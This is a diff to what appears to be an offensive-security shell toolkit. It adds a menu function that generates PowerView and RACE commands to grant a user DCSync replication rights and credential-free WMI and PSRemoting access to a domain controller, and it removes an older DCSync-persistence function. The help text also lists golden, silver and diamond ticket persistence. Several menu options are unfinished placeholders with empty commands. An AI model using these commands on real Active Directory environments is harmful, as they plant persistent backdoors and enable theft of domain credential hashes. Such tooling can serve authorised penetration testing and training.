@@ -43,7 +43,7 @@ nb-ad-pwsh-ea-krbtgt-hash         across trusts - child to parent using krbtgt h
 
 Domain Persistence
 ------------------
-nb-ad-pwsh-persist-dcsync      add dcsync rights to a user
+nb-ad-pwsh-persist-acls        give user ACL rights
 nb-ad-pwsh-persist-golden      create a golden ticket
 nb-ad-pwsh-persist-silver      create a silver ticket
 nb-ad-pwsh-persist-diamond     create a diamond ticket
@@ -56,6 +56,82 @@ nb-ad-cmd-ping                 sweep a network subnet with ping requests on wind
 nb-ad-pwsh-ping                sweep a network subnet with ping requests on windows powershell
 
 DOC
+}
+
+nb-ad-pwsh-persist-acls() {
+    clear
+
+    __warn "Load PowerView with:"
+    __ok ". .\\PowerView.ps1"
+    __ok "nb-pwsh-file-download    - Execute in memory"
+
+    echo
+    __ask "PowerView check for domain PrivEsc vectors:"
+    echo "1. Give user DCSync rights"
+    echo "2. Give user access rights to a machine without explicit credentials"
+    echo "3. "
+    echo "4. "
+    echo "5. "
+    echo "6. "
+    echo
+    echo -n "Choose a command to copy: "
+    read choice
+
+    case $choice in
+        1) 
+          echo
+          __ask "Enter a distinguished name (DN), such as: 'dc=htb,dc=local'"
+          local dn && __askvar dn DN
+          __ask "Enter user whom you want to add the DCSync rights"
+          nb-vars-set-user
+          __ask "Enter the current domain name"
+          nb-vars-set-domain
+          __COMMAND="Add-DomainObjectAcl -TargetIdentity '$dn' -PrincipalIdentity ${__USER} -Rights DCSync -PrincipalDomain ${__DOMAIN} -TargetDomain ${__DOMAIN} -Verbose"
+          echo
+          __info "You can check if the user has now applied rights using command:"
+          __ok "Get-DomainObjectAcl -SearchBase\"$dn\" -SearchScope Base -ResolveGUIDs | ?{(\$_.ObjectAceType -match 'replication-get') -or (\$_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {\$_ | Add-Member NoteProperty'IdentityName' \$(Convert-SidToName \$_.SecurityIdentifier);\$_} | ?{\$_.IdentityName -match "${__USER}"}"
+          echo
+          __info "You can then run DCSync attack with that user:"
+          __ok "nb-ad-pwsh-dcsync"
+          echo
+          __info "Command to add DCSync rights to a ${__USER} copied to clipboard:"
+          ;;
+        2) 
+          echo
+          __warn "You need to load RACE toolkit in powershell:"
+          __ok ". .\\\\RACE.ps1"
+          echo
+          __ask "Enter the target DC hostname"
+          nb-vars-set-rhost
+          nb-vars-set-user
+          nb-vars-set-domain
+          __info "WMI access to ${__USER} without explicit credentials:"
+          __COMMAND="Set-RemoteWMI -SamAccountName ${__USER} -ComputerName ${__RHOST} -namespace 'root\cimv2' -Verbose"
+          echo
+          __info "PSRemoting access to ${__USER} without explicit credentials:"
+          __COMMAND2="Set-RemotePSRemoting -SamAccountName ${__USER} -ComputerName ${__RHOST}.${__DOMAIN} -Verbose"
+          ;;
+        3) 
+          echo
+          __info "Check kerberoastable users"
+          __COMMAND=""
+          ;;
+        4)
+          echo
+          __info "Check kerberoastable users"
+          __COMMAND=""
+          ;;
+        5) 
+          echo
+          __info "Check kerberoastable users"
+          __COMMAND=""
+          ;;
+        6) return;;
+        *) echo "Invalid option"; sleep 1; nb-ad-pwsh-persist-acls; return;;
+    esac
+
+    echo "$__COMMAND" | wl-copy
+    __ok "$__COMMAND"
 }
 
 nb-ad-pwsh-persist-skeleton() {
@@ -142,32 +218,6 @@ nb-ad-pwsh-persist-silver() {
     echo
     __info "Try accessing the service using winrs"
     __ok "nb-ad-cmd-winrs"
-}
-
-nb-ad-pwsh-persist-dcsync() {
-    __check-project
-    __warn "Load PowerView in a process with DA privileges:"
-    __ok ". .\\PowerView.ps1"
-    echo
-    __ask "Enter a distinguished name (DN), such as: 'dc=htb,dc=local'"
-    local dn && __askvar dn DN
-    __ask "Enter user whom you want to add the DCSync rights"
-    nb-vars-set-user
-    __ask "Enter the current domain name"
-    nb-vars-set-domain
-
-    __COMMAND="Add-DomainObjectAcl -TargetIdentity '$dn' -PrincipalIdentity ${__USER} -Rights DCSync -PrincipalDomain ${__DOMAIN} -TargetDomain ${__DOMAIN} -Verbose"
-
-    echo "$__COMMAND" | wl-copy
-    echo
-    __info "Command copied to clipboard:"
-    __ok "$__COMMAND"
-    echo
-    __info "You can check if the user has now applied rights using command:"
-    __ok "Get-DomainObjectAcl -SearchBase\"$dn\" -SearchScope Base -ResolveGUIDs | ?{(\$_.ObjectAceType -match 'replication-get') -or (\$_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {\$_ | Add-Member NoteProperty'IdentityName' \$(Convert-SidToName \$_.SecurityIdentifier);\$_} | ?{\$_.IdentityName -match "${__USER}"}"
-    echo
-    __info "You can now run DCSync attack with that user:"
-    __ok "nb-ad-pwsh-dcsync"
 }
 
 nb-ad-pwsh-persist-golden() {
